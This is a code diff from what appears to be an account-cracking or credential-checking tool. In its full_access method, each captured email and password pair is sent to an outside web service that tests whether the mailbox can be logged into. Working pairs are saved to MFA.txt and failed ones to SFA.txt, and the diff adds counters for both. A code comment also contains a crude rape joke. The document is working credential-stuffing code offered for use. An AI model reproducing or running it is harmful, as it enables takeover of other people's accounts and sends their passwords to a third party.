@@ -131,13 +131,16 @@ class Capture:
             except: self.cape = "Unknown"
 
     def full_access(self):
+        global mfa, sfa
         if config.get('access') is True:
             try:
                 out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False).text) #my mailaccess checking api pls dont rape or it will go offline prob (weak hosting)
                 if out["Success"] == 1: 
                     self.access = "True"
+                    mfa+=1
                     open(f"results/{fname}/MFA.txt", 'a').write(f"{self.email}:{self.password}\n")
-                else: 
+                else:
+                    sfa+=1
                     self.access = "False"
                     open(f"results/{fname}/SFA.txt", 'a').write(f"{self.email}:{self.password}\n")
             except: self.access = "Unknown"
